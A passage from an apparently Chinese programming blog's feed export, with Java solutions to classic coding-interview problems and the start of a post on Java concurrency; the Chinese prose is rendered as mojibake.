¼å­å¼€å§‹ç§»åŠ¨ï¼Œæ¯ä¸€æ¬¡åªèƒ½å‘å·¦ï¼Œå³ï¼Œä¸Šï¼Œä¸‹å››ä¸ªæ–¹å‘ç§»åŠ¨ä¸€æ ¼ï¼Œä½†æ˜¯ä¸èƒ½è¿›å…¥è¡Œåæ ‡å’Œåˆ—åæ ‡çš„æ•°ä½ä¹‹å’Œå¤§äºkçš„æ ¼å­ã€‚ ä¾‹å¦‚ï¼Œå½“kä¸º18æ—¶ï¼Œæœºå™¨äººèƒ½å¤Ÿè¿›å…¥æ–¹æ ¼ï¼ˆ35,37ï¼‰ï¼Œå› ä¸º3+5+3+7 &#x3D; 18ã€‚ä½†æ˜¯ï¼Œå®ƒä¸èƒ½è¿›å…¥æ–¹æ ¼ï¼ˆ35,38ï¼‰ï¼Œå› ä¸º3+5+3+8 &#x3D; 19ã€‚è¯·é—®è¯¥æœºå™¨äººèƒ½å¤Ÿè¾¾åˆ°å¤šå°‘ä¸ªæ ¼å­ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">        <span class="type">int</span>[][] direction = &#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">movingCount</span><span class="params">(<span class="type">int</span> threshold, <span class="type">int</span> rows, <span class="type">int</span> cols)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(threshold&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        HashSet&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        set.add(<span class="number">0</span>);</span><br><span class="line">        dfs(<span class="number">0</span>,<span class="number">0</span>,rows,cols,threshold,set);</span><br><span class="line">        <span class="keyword">return</span> set.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> rows, <span class="type">int</span> cols, <span class="type">int</span> threshold, HashSet&lt;Integer&gt; set)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] dir : direction) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> i+dir[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> y=j+dir[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> x*cols+y;</span><br><span class="line">            <span class="keyword">if</span> (x&gt;=<span class="number">0</span>&amp;&amp;x&lt;rows&amp;&amp;y&gt;=<span class="number">0</span>&amp;&amp;y&lt;cols&amp;&amp;!set.contains(index)&amp;&amp;judge(x,y,threshold))&#123;</span><br><span class="line">                set.add(index);</span><br><span class="line">                dfs(x,y,rows,cols,threshold,set);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">judge</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y,<span class="type">int</span> threshold)</span> &#123;</span><br><span class="line">        <span class="type">int</span> xVal=<span class="number">0</span>,yVal=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">0</span>)&#123;</span><br><span class="line">            xVal+=x%<span class="number">10</span>;</span><br><span class="line">            x=x/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(y!=<span class="number">0</span>)&#123;</span><br><span class="line">            yVal+=y%<span class="number">10</span>;</span><br><span class="line">            y=y/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//System.out.println(xVal+yVal);</span></span><br><span class="line">        <span class="keyword">return</span> xVal+yVal&lt;=threshold;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="æ ˆå’Œé˜Ÿåˆ—">æ ˆå’Œé˜Ÿåˆ—</span></h1><h2><span id="ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—">ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ— âˆš</span></h2><p>ç”¨ä¸¤ä¸ªæ ˆæ¥å®ç°ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå®Œæˆé˜Ÿåˆ—çš„Pushå’ŒPopæ“ä½œã€‚ é˜Ÿåˆ—ä¸­çš„å…ƒç´ ä¸ºintç±»å‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Stack&lt;Integer&gt; in = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;Integer&gt;();</span><br><span class="line">Stack&lt;Integer&gt; out = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;Integer&gt;();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> node)</span> &#123;</span><br><span class="line">    in.push(node);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (out.isEmpty())</span><br><span class="line">        <span class="keyword">while</span> (!in.isEmpty())</span><br><span class="line">            out.push(in.pop());</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (out.isEmpty())</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;queue is empty&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> out.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="ä½è¿ç®—">ä½è¿ç®—</span></h1><h2><span id="ä¸ç”¨åŠ å‡ä¹˜é™¤åšåŠ æ³•">ä¸ç”¨åŠ å‡ä¹˜é™¤åšåŠ æ³• Ã—</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : Add(a ^ b, (a &amp; b) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="äºŒè¿›åˆ¶ä¸­1çš„ä¸ªæ•°">äºŒè¿›åˆ¶ä¸­1çš„ä¸ªæ•° Ã—</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">NumberOf1</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">/*</span></span><br><span class="line"><span class="comment">           * ç”¨1å’Œnè¿›è¡Œä½ä¸è¿ç®—ï¼Œ</span></span><br><span class="line"><span class="comment">           * ç»“æœè¦æ˜¯ä¸º1åˆ™nçš„2è¿›åˆ¶å½¢å¼</span></span><br><span class="line"><span class="comment">           * æœ€å³è¾¹é‚£ä½è‚¯å®šæ˜¯1ï¼Œå¦åˆ™ä¸º0</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">           <span class="keyword">if</span> ((n &amp; <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">               count++;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//æŠŠnçš„2è¿›åˆ¶å½¢å¼å¾€å³æ¨ä¸€ä½</span></span><br><span class="line">           n = n &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> count;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="æ•°ç»„ä¸­åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—">æ•°ç»„ä¸­åªå‡ºç°ä¸€æ¬¡çš„æ•°å­— Ã—</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">FindNumsAppearOnce</span><span class="params">(<span class="type">int</span> [] nums,<span class="type">int</span> num1[] , <span class="type">int</span> num2[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">diff</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> num : nums)</span><br><span class="line">    diff ^= num;</span><br><span class="line">diff &amp;= -diff;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((num &amp; diff) == <span class="number">0</span>)</span><br><span class="line">         num1[<span class="number">0</span>] ^= num;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         num2[<span class="number">0</span>] ^= num;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="å…¶ä»–">å…¶ä»–</span></h1><h2><span id="æ±‚123n">æ±‚1+2+3+â€¦+n Ã—</span></h2><p>æ±‚1+2+3+â€¦+nï¼Œè¦æ±‚ä¸èƒ½ä½¿ç”¨ä¹˜é™¤æ³•ã€forã€whileã€ifã€elseã€switchã€caseç­‰å…³é”®å­—åŠæ¡ä»¶åˆ¤æ–­è¯­å¥ï¼ˆA?B:Cï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">Sum_Solution</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> n;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ans</span> <span class="operator">=</span> (n&gt;<span class="number">0</span>)&amp;&amp;((sum+=Sum_Solution(n-<span class="number">1</span>))&gt;<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="æ•°æ®æµçš„ä¸­ä½æ•°-">æ•°æ®æµçš„ä¸­ä½æ•° -</span></h2><p>å¦‚ä½•å¾—åˆ°ä¸€ä¸ªæ•°æ®æµä¸­çš„ä¸­ä½æ•°ï¼Ÿå¦‚æœä»æ•°æ®æµä¸­è¯»å‡ºå¥‡æ•°ä¸ªæ•°å€¼ï¼Œé‚£ä¹ˆä¸­ä½æ•°å°±æ˜¯æ‰€æœ‰æ•°å€¼æ’åºä¹‹åä½äºä¸­é—´çš„æ•°å€¼ã€‚å¦‚æœä»æ•°æ®æµä¸­è¯»å‡ºå¶æ•°ä¸ªæ•°å€¼ï¼Œé‚£ä¹ˆä¸­ä½æ•°å°±æ˜¯æ‰€æœ‰æ•°å€¼æ’åºä¹‹åä¸­é—´ä¸¤ä¸ªæ•°çš„å¹³å‡å€¼ã€‚æˆ‘ä»¬ä½¿ç”¨Insert()æ–¹æ³•è¯»å–æ•°æ®æµï¼Œä½¿ç”¨GetMedian()æ–¹æ³•è·å–å½“å‰è¯»å–æ•°æ®çš„ä¸­ä½æ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    PriorityQueue&lt;Integer&gt; left=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((o1,o2) -&gt;o2 - o1);</span><br><span class="line">    PriorityQueue&lt;Integer&gt; right=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> N=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Insert</span><span class="params">(Integer num)</span> &#123;</span><br><span class="line">        N++;</span><br><span class="line">        <span class="keyword">if</span>(N%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            right.add(num);</span><br><span class="line">            left.add(right.poll());</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            left.add(num);</span><br><span class="line">            right.add(left.poll());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Double <span class="title function_">GetMedian</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(N%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> (right.peek()+left.peek())/<span class="number">2.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">double</span>)left.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼-">æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼ -</span></h2><p>ç»™å®šä¸€ä¸ªæ•°ç»„å’Œæ»‘åŠ¨çª—å£çš„å¤§å°ï¼Œæ‰¾å‡ºæ‰€æœ‰æ»‘åŠ¨çª—å£é‡Œæ•°å€¼çš„æœ€å¤§å€¼ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¾“å…¥æ•°ç»„{2,3,4,2,6,2,5,1}åŠæ»‘åŠ¨çª—å£çš„å¤§å°3ï¼Œé‚£ä¹ˆä¸€å…±å­˜åœ¨6ä¸ªæ»‘åŠ¨çª—å£ï¼Œä»–ä»¬çš„æœ€å¤§å€¼åˆ†åˆ«ä¸º{4,4,6,6,6,5}ï¼› é’ˆå¯¹æ•°ç»„{2,3,4,2,6,2,5,1}çš„æ»‘åŠ¨çª—å£æœ‰ä»¥ä¸‹6ä¸ªï¼š {[2,3,4],2,6,2,5,1}ï¼Œ {2,[3,4,2],6,2,5,1}ï¼Œ {2,3,[4,2,6],2,5,1}ï¼Œ {2,3,4,[2,6,2],5,1}ï¼Œ {2,3,4,2,[6,2,5],1}ï¼Œ {2,3,4,2,6,[2,5,1]}ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">maxInWindows</span><span class="params">(<span class="type">int</span>[] num, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (size &gt; num.length || size &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    PriorityQueue&lt;Integer&gt; heap = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((o1, o2) -&gt; o2 - o1);  <span class="comment">/* å¤§é¡¶å † */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        heap.add(num[i]);</span><br><span class="line">    ret.add(heap.peek());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = i + size; j &lt; num.length; i++, j++) &#123;            <span class="comment">/* ç»´æŠ¤ä¸€ä¸ªå¤§å°ä¸º size çš„å¤§é¡¶å † */</span></span><br><span class="line">        heap.remove(num[i]);</span><br><span class="line">        heap.add(num[j]);</span><br><span class="line">        ret.add(heap.peek());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="å­©å­ä»¬çš„æ¸¸æˆ">å­©å­ä»¬çš„æ¸¸æˆ Ã—</span></h2><p>æ¯å¹´å…­ä¸€å„¿ç«¥èŠ‚,ç‰›å®¢éƒ½ä¼šå‡†å¤‡ä¸€äº›å°ç¤¼ç‰©å»çœ‹æœ›å­¤å„¿é™¢çš„å°æœ‹å‹,ä»Šå¹´äº¦æ˜¯å¦‚æ­¤ã€‚HFä½œä¸ºç‰›å®¢çš„èµ„æ·±å…ƒè€,è‡ªç„¶ä¹Ÿå‡†å¤‡äº†ä¸€äº›å°æ¸¸æˆã€‚å…¶ä¸­,æœ‰ä¸ªæ¸¸æˆæ˜¯è¿™æ ·çš„:é¦–å…ˆ,è®©å°æœ‹å‹ä»¬å›´æˆä¸€ä¸ªå¤§åœˆã€‚ç„¶å,ä»–éšæœºæŒ‡å®šä¸€ä¸ªæ•°m,è®©ç¼–å·ä¸º0çš„å°æœ‹å‹å¼€å§‹æŠ¥æ•°ã€‚æ¯æ¬¡å–Šåˆ°m-1çš„é‚£ä¸ªå°æœ‹å‹è¦å‡ºåˆ—å”±é¦–æ­Œ,ç„¶åå¯ä»¥åœ¨ç¤¼å“ç®±ä¸­ä»»æ„çš„æŒ‘é€‰ç¤¼ç‰©,å¹¶ä¸”ä¸å†å›åˆ°åœˆä¸­,ä»ä»–çš„ä¸‹ä¸€ä¸ªå°æœ‹å‹å¼€å§‹,ç»§ç»­0â€¦m-1æŠ¥æ•°â€¦.è¿™æ ·ä¸‹å»â€¦.ç›´åˆ°å‰©ä¸‹æœ€åä¸€ä¸ªå°æœ‹å‹,å¯ä»¥ä¸ç”¨è¡¨æ¼”,å¹¶ä¸”æ‹¿åˆ°ç‰›å®¢åè´µçš„â€œåä¾¦æ¢æŸ¯å—â€å…¸è—ç‰ˆ(åé¢æœ‰é™å“¦!!^_^)ã€‚è¯·ä½ è¯•ç€æƒ³ä¸‹,å“ªä¸ªå°æœ‹å‹ä¼šå¾—åˆ°è¿™ä»½ç¤¼å“å‘¢ï¼Ÿ(æ³¨ï¼šå°æœ‹å‹çš„ç¼–å·æ˜¯ä»0åˆ°n-1)</p><p>å¦‚æœæ²¡æœ‰å°æœ‹å‹ï¼Œè¯·è¿”å›-1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">LastRemaining_Solution</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span> &#123;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> (m+LastRemaining_Solution(n-<span class="number">1</span>,m))%n;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹">æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹ âˆš</span></h2><p>ç»™å®šä¸€ä¸ªdoubleç±»å‹çš„æµ®ç‚¹æ•°baseå’Œintç±»å‹çš„æ•´æ•°exponentã€‚æ±‚baseçš„exponentæ¬¡æ–¹ã€‚</p><p>ä¿è¯baseå’Œexponentä¸åŒæ—¶ä¸º0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">Power</span><span class="params">(<span class="type">double</span> base, <span class="type">int</span> exponent)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(exponent==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(exponent==<span class="number">1</span>) <span class="keyword">return</span> base;</span><br><span class="line">        <span class="keyword">if</span>(exponent&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            base=<span class="number">1</span>/base;</span><br><span class="line">            exponent=-exponent;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> exponent%<span class="number">2</span>==<span class="number">0</span>?Power(base*base,exponent/<span class="number">2</span>):base*Power(base*base,exponent/<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2><span id="æ•´æ•°ä¸­1å‡ºç°çš„æ¬¡æ•°">æ•´æ•°ä¸­1å‡ºç°çš„æ¬¡æ•° Ã—</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">NumberOf1Between1AndN_Solution</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ones</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">1</span>; m &lt;= n; m *= <span class="number">10</span>)</span><br><span class="line">        ones += (n/m + <span class="number">8</span>) / <span class="number">10</span> * m + (n/m % <span class="number">10</span> == <span class="number">1</span> ? n%m + <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ones;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‰‘æŒ‡Offer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¤šçº¿ç¨‹ä¸å¹¶å‘åŸç†</title>
      <link href="/2020/04/06/mt/"/>
      <url>/2020/04/06/mt/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç›˜ç‚¹äº†å¸¸è€ƒçš„Javaå¤šçº¿ç¨‹ä¸å¹¶å‘åŸç†</p><span id="more"></span><!-- toc --><ul><li><a href="#%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%9A%84%E4%B8%BB%E8%A6%81%E8%AF%B1%E5%9B%A0">çº¿ç¨‹å®‰å…¨é—®é¢˜çš„ä¸»è¦è¯±å› </a><ul><li><a href="#%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98%E7%9A%84%E6%A0%B9%E6%9C%AC%E6%96%B9%E6%B3%95">è§£å†³é—®é¢˜çš„æ ¹æœ¬æ–¹æ³•</a></li></ul></li><li><a href="#%E4%BA%92%E6%96%A5%E9%94%81">äº’æ–¥é”</a><ul><li><a href="#%E4%BA%92%E6%96%A5%E9%94%81%E7%9A%84%E7%89%B9%E6%80%A7">äº’æ–¥é”çš„ç‰¹æ€§</a><ul><li><a href="#%E4%BA%92%E6%96%A5%E6%80%A7">äº’æ–¥æ€§</a></li><li><a href="#%E5%8F%AF%E8%A7%81%E6%80%A7">å¯è§æ€§</a></li></ul></li></ul></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B1%A1">è·å–å¯¹è±¡</a><ul><li><a href="#%E6%A0%B9%E6%8D%AE%E8%8E%B7%E5%8F%96%E7%9A%84%E9%94%81%E7%9A%84%E5%88%86%E7%B1%BB%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B1%A1%E9%94%81%E5%92%8C%E8%8E%B7%E5%8F%96%E7%B1%BB%E9%94%81">æ ¹æ®è·å–çš„é”çš„åˆ†ç±»ï¼šè·å–å¯¹è±¡é”å’Œè·å–ç±»é”</a><ul><li><a href="#%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B1%A1%E9%94%81%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%94%A8%E6%B3%95">è·å–å¯¹è±¡é”çš„ä¸¤ç§ç”¨æ³•</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E7%B1%BB%E9%94%81%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%94%A8%E6%B3%95">è·å–ç±»é”çš„ä¸¤ç§ç”¨æ³•</a></li><li><a href="#%E5%AF%B9%E8%B1%A1%E9%94%81%E5%92%8C%E7%B1%BB%E9%94%81%E7%9A%84%E6%80%BB%E7%BB%93">å¯¹è±¡é”å’Œç±»é”çš„æ€»ç»“</a></li></ul></li></ul></li><li><a href="#%E5%AF%B9%E8%B1%A1%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%B8%83%E5%B1%80">å¯¹è±¡åœ¨å†…å­˜ä¸­çš„å¸ƒå±€</a><ul><li><a href="#%E5%AF%B9%E8%B1%A1%E5%A4%B4%E7%9A%84%E7%BB%93%E6%9E%84">å¯¹è±¡å¤´çš„ç»“æ„</a></li><li><a href="#mark-word">Mark Word</a></li></ul></li><li><a href="#monitor%E6%AF%8F%E4%B8%AAjava%E5%AF%B9%E8%B1%A1%E5%A4%A9%E7%94%9F%E8%87%AA%E5%B8%A6%E4%BA%86%E4%B8%80%E6%8A%8A%E7%9C%8B%E4%B8%8D%E8%A7%81%E7%9A%84%E9%94%81c%E5%AE%9E%E7%8E%B0">Monitorï¼šæ¯ä¸ªJavaå¯¹è±¡å¤©ç”Ÿè‡ªå¸¦äº†ä¸€æŠŠçœ‹ä¸è§çš„é”ï¼ˆC++å®ç°ï¼‰</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%BB%8E%E9%87%8D%E5%85%A5">ä»€ä¹ˆæ˜¯ä»é‡å…¥</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%AF%B9synchronized%E5%97%A4%E4%B9%8B%E4%BB%A5%E9%BC%BB">ä¸ºä»€ä¹ˆä¼šå¯¹synchronizedå—¤ä¹‹ä»¥é¼»</a></li><li><a 